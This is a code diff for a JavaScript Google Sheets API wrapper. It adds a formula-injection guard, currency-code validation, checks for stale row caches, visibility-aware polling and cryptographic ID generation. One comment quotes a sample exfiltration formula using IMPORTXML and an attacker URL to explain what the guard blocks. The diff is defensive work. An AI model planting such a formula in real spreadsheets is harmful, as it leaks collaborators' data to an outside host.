@@ -50,7 +50,7 @@ const HOLDINGS_AS_OF_Z1 = 'Z1';
 function holdingsMarketValueFormula(row, accountCurrency) {
   const c = `C${row}`;
   const d = `D${row}`;
-  const cur = (accountCurrency || 'CAD').toUpperCase();
+  const cur = safeCurrencyCode(accountCurrency);
 
   const priceFx = [
     `LET(`,
@@ -177,13 +177,46 @@ export function localDateISO(d = new Date()) {
   return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
 }
 
+// ── Formula-injection guard ────────────────────────────────────────────────────
+
+const PLAIN_NUMBER_RE = /^[+-]?(\d+([.,]\d*)?|[.,]\d+)(e[+-]?\d+)?$/i;
+
+/**
+ * Cells are written with valueInputOption=USER_ENTERED (so dates and numbers keep working), which
+ * also means Google Sheets would EXECUTE any text that looks like a formula - for example a title
+ * of `=IMPORTXML("https://attacker/?"&A1)` entered by a collaborator on a shared group.
+ * This prefixes such text with a single quote, which Sheets treats as "store as plain text"
+ * (the quote itself is not stored or returned). Numbers like "-12.50" are left alone.
+ */
+export function neutralizeFormula(v) {
+  if (typeof v !== 'string' || v === '') return v;
+  const c = v[0];
+  if (c === '=' || c === '@') return "'" + v;
+  if ((c === '+' || c === '-') && !PLAIN_NUMBER_RE.test(v.trim())) return "'" + v;
+  return v;
+}
+
+function safeRow(values) {
+  return Array.isArray(values) ? values.map(neutralizeFormula) : values;
+}
+
+/** ISO 4217-style code only; anything else falls back to CAD (value ends up inside a sheet formula). */
+function safeCurrencyCode(code) {
+  const c = String(code || '').trim().toUpperCase();
+  return /^[A-Z]{3}$/.test(c) ? c : 'CAD';
+}
+
 // ── Internal state ─────────────────────────────────────────────────────────────
 
 const rowCache = new Map();           // "sheetId::tabName" → Map<id, rowIndex>
+const rowCacheBuiltAt = new Map();    // "sheetId::tabName" → Date.now() when the cache was built
+/** Row indexes older than this are re-verified before a write (collaborators may have inserted/deleted rows). */
+const ROW_CACHE_VERIFY_AFTER_MS = 5000;
 const modifiedTimeCache = new Map();  // spreadsheetId → lastModifiedTime
 let changeDetectionTimer = null;
 let _onChangeDetected = null;
 let _watchedSheetIds = [];
+let visibilityListenerAdded = false;
 
 // ── Retry helper ───────────────────────────────────────────────────────────────
 
@@ -262,6 +295,7 @@ function buildRowCache(spreadsheetId, tabName, rows, idColumnIndex = 0) {
     if (id) map.set(id, i + 2); // +2 because row 1 is headers, API is 1-indexed
   });
   rowCache.set(key, map);
+  rowCacheBuiltAt.set(key, Date.now());
 }
 
 function getCachedRowIndex(spreadsheetId, tabName, id) {
@@ -270,12 +304,27 @@ function getCachedRowIndex(spreadsheetId, tabName, id) {
   return map ? map.get(id) : undefined;
 }
 
+function isRowCacheFresh(spreadsheetId, tabName) {
+  const builtAt = rowCacheBuiltAt.get(cacheKey(spreadsheetId, tabName));
+  return !!builtAt && (Date.now() - builtAt) < ROW_CACHE_VERIFY_AFTER_MS;
+}
+
+/** Does the given sheet row still hold `id` in its ID column? (single-cell read) */
+async function rowHasId(spreadsheetId, tabName, rowIndex, id, idColumnIndex = 0) {
+  const col = String.fromCharCode(65 + idColumnIndex);
+  const range = encodeURIComponent(`${tabName}!${col}${rowIndex}`);
+  const data = await fetchWithRetry(`${SHEETS_BASE}/${spreadsheetId}/values/${range}`);
+  const cell = data && data.values && data.values[0] ? data.values[0][0] : '';
+  return String(cell ?? '') === String(id);
+}
+
 function invalidateCache(spreadsheetId, tabName) {
   if (tabName) {
     rowCache.delete(cacheKey(spreadsheetId, tabName));
+    rowCacheBuiltAt.delete(cacheKey(spreadsheetId, tabName));
   } else {
-    for (const k of rowCache.keys()) {
-      if (k.startsWith(spreadsheetId + '::')) rowCache.delete(k);
+    for (const k of [...rowCache.keys()]) {
+      if (k.startsWith(spreadsheetId + '::')) { rowCache.delete(k); rowCacheBuiltAt.delete(k); }
     }
   }
 }
@@ -320,7 +369,7 @@ const SheetsApi = {
       `${SHEETS_BASE}/${spreadsheetId}/values/${encoded}:append?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS`,
       {
         method: 'POST',
-        body: JSON.stringify({ values: [values] }),
+        body: JSON.stringify({ values: [safeRow(values)] }),
       }
     );
     invalidateCache(spreadsheetId, tabName);
@@ -334,7 +383,7 @@ const SheetsApi = {
       `${SHEETS_BASE}/${spreadsheetId}/values/${encoded}:append?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS`,
       {
         method: 'POST',
-        body: JSON.stringify({ values: rowsArray }),
+        body: JSON.stringify({ values: rowsArray.map(safeRow) }),
       }
     );
     invalidateCache(spreadsheetId, tabName);
@@ -348,6 +397,17 @@ const SheetsApi = {
     if (isDemoSheet(spreadsheetId)) return { spreadsheetId, updates: {} };
     let rowIndex = getCachedRowIndex(spreadsheetId, tabName, id);
 
+    // A cached row number can be stale if a collaborator inserted/deleted rows since it was built.
+    // Writing to the wrong row would silently overwrite someone else's record, so when the cache
+    // is not brand new, confirm that the row still holds this ID (one tiny single-cell read).
+    if (rowIndex && !isRowCacheFresh(spreadsheetId, tabName)) {
+      const stillThere = await rowHasId(spreadsheetId, tabName, rowIndex, id, idColumnIndex);
+      if (!stillThere) {
+        invalidateCache(spreadsheetId, tabName);
+        rowIndex = undefined;
+      }
+    }
+
     if (!rowIndex) {
       await this.getTabData(spreadsheetId, tabName, idColumnIndex);
       rowIndex = getCachedRowIndex(spreadsheetId, tabName, id);
@@ -360,7 +420,7 @@ const SheetsApi = {
       `${SHEETS_BASE}/${spreadsheetId}/values/${range}?valueInputOption=USER_ENTERED`,
       {
         method: 'PUT',
-        body: JSON.stringify({ values: [values] }),
+        body: JSON.stringify({ values: [safeRow(values)] }),
       }
     );
     invalidateCache(spreadsheetId, tabName);
@@ -405,9 +465,8 @@ const SheetsApi = {
    */
   async batchUpdateRows(spreadsheetId, tabName, updates, idColumnIndex = 0) {
     if (isDemoSheet(spreadsheetId)) return;
-    // Ensure cache
-    let hasCache = rowCache.has(cacheKey(spreadsheetId, tabName));
-    if (!hasCache) {
+    // Ensure the row cache exists and is recent (stale row numbers would write to the wrong rows)
+    if (!rowCache.has(cacheKey(spreadsheetId, tabName)) || !isRowCacheFresh(spreadsheetId, tabName)) {
       await this.getTabData(spreadsheetId, tabName, idColumnIndex);
     }
 
@@ -416,7 +475,7 @@ const SheetsApi = {
       if (!rowIndex) return null;
       return {
         range: `${tabName}!A${rowIndex}:Z${rowIndex}`,
-        values: [u.values],
+        values: [safeRow(u.values)],
       };
     }).filter(Boolean);
 
@@ -528,7 +587,9 @@ const SheetsApi = {
     const merged = [...otherData, ...newRows];
     const withFormulas = merged.map((r, i) => {
       const row = i + 2;
-      const [id, accId, sym, shares] = r;
+      // Values here are rewritten with USER_ENTERED, including rows read back from the sheet
+      // (possibly edited by a collaborator), so neutralize anything that looks like a formula.
+      const [id, accId, sym, shares] = r.map(neutralizeFormula);
       return [id, accId, sym, shares, holdingsMarketValueFormula(row, currencyMap[accId])];
     });
     while (withFormulas.length < raw.length) {
@@ -796,8 +857,6 @@ const SheetsApi = {
       console.error('createSpreadsheet: API response missing spreadsheetId:', result);
       throw new Error('Google Sheets did not return a spreadsheet ID');
     }
-    console.log('createSpreadsheet: created', spreadsheetId);
-
     // Write headers for each tab
     const headerData = Object.entries(TAB_HEADERS).map(([tabName, headers]) => ({
       range: `${tabName}!A1`,
@@ -959,7 +1018,19 @@ const SheetsApi = {
     }
 
     this.stopChangeDetection();
-    changeDetectionTimer = setInterval(() => this.checkForChanges(), intervalMs);
+    // Don't poll Drive while the tab/app is in the background (saves API quota and battery).
+    changeDetectionTimer = setInterval(() => {
+      if (typeof document !== 'undefined' && document.hidden) return;
+      this.checkForChanges();
+    }, intervalMs);
+
+    // Catch up right away when the user comes back to the app.
+    if (!visibilityListenerAdded && typeof document !== 'undefined') {
+      visibilityListenerAdded = true;
+      document.addEventListener('visibilitychange', () => {
+        if (!document.hidden && changeDetectionTimer) this.checkForChanges();
+      });
+    }
   },
 
   stopChangeDetection() {
@@ -989,7 +1060,10 @@ const SheetsApi = {
   // ── Utility ────────────────────────────────────────────────────────────────
 
   generateId() {
-    return 'v_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 8);
+    // Same shape as before ("v_<time>_<6 chars>") but with cryptographic randomness, so two
+    // collaborators adding rows in the same millisecond cannot realistically collide.
+    const rnd = crypto.getRandomValues(new Uint8Array(6));
+    return 'v_' + Date.now().toString(36) + '_' + Array.from(rnd, b => (b % 36).toString(36)).join('');
   },
 
   invalidateCache,
